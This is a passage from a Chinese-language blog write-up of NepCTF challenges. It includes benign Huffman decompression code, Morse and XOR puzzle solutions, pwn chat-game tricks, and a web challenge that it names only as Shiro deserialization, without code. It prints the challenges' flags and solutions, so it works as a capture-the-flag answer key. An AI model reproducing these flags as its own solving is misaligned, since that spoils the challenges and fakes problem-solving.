builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree_from_bytes</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        frequencies_count <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>frequencies_count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        root <span class=\"token operator\">=</span> build_huffman_tree_from_bytes<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        reverse_huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>v<span class=\"token punctuation\">:</span> k <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> huffman_codes<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        decompressed_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            byte <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> byte <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">if</span> code <span class=\"token keyword\">in</span> reverse_huffman_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    decompressed_data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reverse_huffman_codes<span class=\"token punctuation\">[</span>code<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                    code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>decompressed_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token comment\"># input_file = 'input.txt'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    compressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'compressed.bin'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    decompressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'decompressed.txt'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># 压缩文件</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token comment\"># compress(input_file, compressed_file)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token comment\"># 解压缩文件</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    decompress<span class=\"token punctuation\">(</span>compressed_file<span class=\"token punctuation\">,</span> decompressed_file<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/2.png\" alt=\"\"></p>\n<h4 id=\"3connectedfive\"><a class=\"markdownIt-Anchor\" href=\"#3connectedfive\">#</a> 3.ConnectedFive</h4>\n<p>五子连珠，到 42 即可拿 flag</p>\n<p><img data-src=\"/img/wp/3.png\" alt=\"\"></p>\n<h4 id=\"4checkin\"><a class=\"markdownIt-Anchor\" href=\"#4checkin\">#</a> 4.CheckIn</h4>\n<blockquote>\n<p>NepCTF H4ve_Fun_1N_This_Game}</p>\n</blockquote>\n<h4 id=\"5陌生的语言\"><a class=\"markdownIt-Anchor\" href=\"#5陌生的语言\">#</a> 5. 陌生的语言</h4>\n<p><img data-src=\"/img/wp/1.jpg\" alt=\"1\"></p>\n<p><img data-src=\"/img/wp/1691849788716.jpg\" alt=\"1691849788716\"></p>\n<p>对照码表：NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<p>NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>\n<h4 id=\"6小叮弹钢琴\"><a class=\"markdownIt-Anchor\" href=\"#6小叮弹钢琴\">#</a> 6. 小叮弹钢琴</h4>\n<p>音频有信息</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<blockquote>\n<p>-.–/—/…-/…/…/—/…-/.-…/-…/…-/…/./-/…/…/…/-/—/-…-/—/.-./…/—/–/./-/…/…/-./–.</p>\n</blockquote>\n<p>摩斯转化</p>\n<blockquote>\n<p>YOU SHOULD USE THIS TO XOR SOME THING</p>\n</blockquote>\n<p>异或字符串（16 进制转化）</p>\n<blockquote>\n<p>0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d<br>\n0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50</p>\n</blockquote>\n<p>修改一下：找下规律去修改一下</p>\n<blockquote>\n<p>0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d</p>\n</blockquote>\n<blockquote>\n<p>NepCTF h4ppy_p14N0}</p>\n</blockquote>\n<h4 id=\"7问卷\"><a class=\"markdownIt-Anchor\" href=\"#7问卷\">#</a> 7. 问卷</h4>\n<p><img data-src=\"/img/wp/image-20230813202714138.png\" alt=\"image-20230813202714138\"></p>\n<h2 id=\"2-pwn\"><a class=\"markdownIt-Anchor\" href=\"#2-pwn\">#</a> 2. pwn:</h2>\n<h4 id=\"hrp-chat-4\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-4\">#</a> HRP-CHAT-4</h4>\n<p><img data-src=\"/img/wp/image-20230813203342637.png\" alt=\"image-20230813203342637\"></p>\n<p><img data-src=\"/img/wp/image-20230813203738235.png\" alt=\"image-20230813204233847\"></p>\n<p>一直买直到破坏子线程，然后执行   Safe_Mode_Key</p>\n<p>得到 flag：This is your key!</p>\n<blockquote>\n<p>Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691</p>\n</blockquote>\n<h4 id=\"hrp-chat-3\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-3\">#</a> HRP-CHAT-3</h4>\n<p><img data-src=\"/img/wp/image-20230813204233847.png\" alt=\"image-20230813204233847\"></p>\n<p>把 Boss 能得到 flag，只能去抽奖，但抽不到最高的，但是 H3h3QAQ 够用了</p>\n<p><img data-src=\"/img/wp/image-20230813204151370.png\" alt=\"image-20230813204151370\"></p>\n<p><img data-src=\"/img/wp/image-20230813204502026.png\" alt=\"image-20230813204502026\"></p>\n<p>序号是 9</p>\n<p><img data-src=\"/img/wp/image-20230813204547270.png\" alt=\"image-20230813204547270\"></p>\n<p>得到 flag</p>\n<h2 id=\"3-web\"><a class=\"markdownIt-Anchor\" href=\"#3-web\">#</a> 3. web:</h2>\n<h4 id=\"ez_java_checkin\"><a class=\"markdownIt-Anchor\" href=\"#ez_java_checkin\">#</a> ez_java_checkin</h4>\n<p>shiro 反序列化</p>\n<p><img data-src=\"/img/wp/image-20230813205114576.png\" alt=\"image-20230813205114576\"></p>\n<p><img data-src=\"/img/wp/image-20230813205917940.png\" alt=\"image-20230813205917940\"></p>\n<p><img data-src=\"/img/wp/image-20230813210003062.png\" alt=\"image-20230813210003062\"></p>\n<p>得到 flag。</p>\n",
            "tags": [
                "wp"
            ]
        }
    ]
}